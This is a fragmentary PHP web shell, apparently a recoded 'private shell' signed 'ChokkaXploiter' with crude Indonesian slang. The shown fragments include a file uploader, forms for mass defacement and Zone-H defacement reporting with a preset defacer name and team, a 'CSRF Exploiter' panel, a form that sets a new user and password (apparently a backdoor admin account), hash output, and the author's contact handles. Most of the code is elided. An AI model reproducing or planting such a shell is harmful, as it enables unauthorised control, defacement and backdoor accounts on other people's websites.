...
<title>XxX Shell Privat Ya Anjeng XxX</title>
<meta property="og:image"https://www.upload.ee/thumb/12455647/Hayo_mau_coli_kan.jpg">
<style>
body{
...
.destroy_table {;
  ...
  background-color: #000000;
            background-image: url(https://www.upload.ee/image/12447686/Bahancoli.jpg);
...
text-align: center;
  ...
  resize: none;
  background-color: #000000;
            background-image: url(https://www.upload.ee/image/12441093/DA.jpg);
            background-repeat: no-repeat;
            background-attachment: fixed;
            background-size: 100%  100%;   
  color: #ffffff;
...
<center>
<br>
<font face="Kelly Slab" color="white" size="7px">ChokkaXploiter </font><br>
</h1></center>
...
+ Recoded By   <td>: <font color='lime'> DemonArmyGans | Nge Recode Itu Halal:v<tr><td><font color='white'>
+ Thanks To  <td>: <font color='lime'>all team gua Dan Mastah Gua</font></tr></td><br>
</table>";
...
echo '<font color="yellow">UPLOADED SUCCES SAYANG^-^ !!!!!</script><br/>';
}else{
...
if($_GET['to'] == 'zoneh') {
	if($_POST['submit']) {
		...
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='ChokkaXploiter'><br>
		<u>Domains</u>: <br>
...
echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='hekel' size='50' value='ChokkaXploiter'><br>
		<u>Team</u>: <br>
		<input type='text' name='tim' size='50' value='NLC OFFICIAL TEAM'><br>
		<u>Domains</u>: <br>
...
<p><input name=\"m\" size=\"80\" value=\"Start\" type=\"submit\"/></p>
	...
	<input type='text' name='d_file' value='memek.php' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Index File:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>ChokkaXploiter</textarea><br>
	...
	{	
	echo '<html>
	<center><h1 style="font-size:33px;">CSRF Exploiter By IndoXPloit<br>Recoded by DemonArmyGanss</h1><br><br>
...
echo "</div>";
 ...
 Set User & Pass: <br>
 <input type='text' name='user_baru' value='ChokkaGans' placeholder='user_baru'><br>
 <input type='text' name='pass_baru' value='ChokkaGans' placeholder='pass_baru'><br>
 ...
 echo 'Sha1 with Salt & MD5: <input class=inputz type=text size=50 value='.$hash1_sha1_double.'></center></table>';
  ...
  <tr>
   <td>
   <center>
   <h2 style='color'blue'>AboutMe:</font></h2>
   <p>Email/Facebook/Instagram Me Di Bawah<p>
   <p>ChokkaXploiter@gmail.com<p>
   <p>Facebook.com/muhammad rifki<p>
   <p>Instagram.com/thisrifky_<p>
   	<p>JANGAN LUPA ADD AND FOLLOW EA BABI</p>
   </center>
   </td>
   </tr>
   <?php
...
echo '<center><br/><font face="Kelly Slab" color="white" style="text-shadow:0 0 20px gold, 0 0 5px gold, 0 0 7px red, 0 0 45px gold; font-weight:bold: white; font-size:15px">Recoded &copy;2k19 ChokkaXploiter |  Allright Reserved</center>
</body>
</html>';
function perms($file){
